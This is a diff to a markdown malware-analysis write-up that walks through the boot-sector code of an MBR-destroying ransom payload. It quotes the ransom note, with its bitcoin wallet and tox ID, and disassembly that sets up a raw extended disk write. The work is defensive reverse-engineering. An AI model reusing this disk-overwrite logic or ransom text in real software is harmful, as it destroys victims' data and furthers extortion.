@@ -321,16 +321,40 @@ The first instruction is equivalent to a `nop` really - just jumps to the next i
 Under `lbl_start`, we set `ds` (the data segment selector) to be equal to `cs` (the code selector) using the `ax` register (since you can't do `mov ds, cs`).  
 The `si` register points to `0x7C88`, which contains a string:
 ```assembly
-db Your hard drive has been corrupted.',0Dh,0Ah
+db 'Your hard drive has been corrupted.',0Dh,0Ah
 db 'In case you want to recover all hard drives',0Dh,0Ah
 db 'of your organization,',0Dh,0Ah
 db 'You should pay us  $10k via bitcoin wallet',0Dh,0Ah
 db '1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv and send message via',0Dh,0Ah
 db 'tox ID 8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C057ECED5496F65',0Dh,0Ah
 db 'with your organization name.',0Dh,0Ah
-db 'We will contact you to give further instructions.,0
+db 'We will contact you to give further instructions.',0
 ```
 The `call $+3` and `push ax` effectively pushes `cs:ip` as `cs:0x7C0C` (remember `call` pushes the return address to the stack).  
 Then, we see something familiar - `cld` (clearing the direction flag) followed by printing of characters (`routine_print_string`).  
 While the code is slightly different, you can see a comparison of `al` and 0 (which is the NUL terminator) and calling `routine_print_char` if it's not zero.  
-The `routine_print_char` simply calls `int 0x10` as we've previously seen.
+The `routine_print_char` simply calls `int 0x10` as we've previously seen.  
+
+The next chunk of assembly is:
+```assembly
+ lbl_next_phase:
+	mov     ax, cs
+	mov     ds, ax
+	mov     word ptr ds:7C78h, ax
+	mov     dword ptr ds:7C76h, 7C82h
+	mov     ah, 43h ; 'C'
+	mov     al, 0
+	mov     dl, ds:byte_7C74+13h
+	add     dl, 80h
+	mov     si, 7C72h
+	int     13h             ; DISK - IBM/MS Extension - EXTENDED WRITE (DL - drive, AL - verify flag, DS:SI - disk address packet)
+	jb      short loc_7C45
+	jnb     short loc_7C5D
+```
+
+The first two instructions again set the `ds` register to be equal to `cs` - this hints the MBR payload was stitched together by multiple sources, because this part somehow does not assume `ds`, even though it was set before.  
+Everything else is preparation for a complex `int 0x13` operation which writes to disk:
+- The `ah` value of `0x43` tells the interrupt that this should be an [extended write operation](http://www.ctyme.com/intr/rb-0710.htm).
+- The `dl` register is the drive number. The value `0x80` has the MSB up, which is disk 0, but TBD.
+- The `al` register is a "verify flag", which is set to 0 (no verification).
+- The pair `ds:si` point to the buffer we're going to write - which is address `0x7C72`
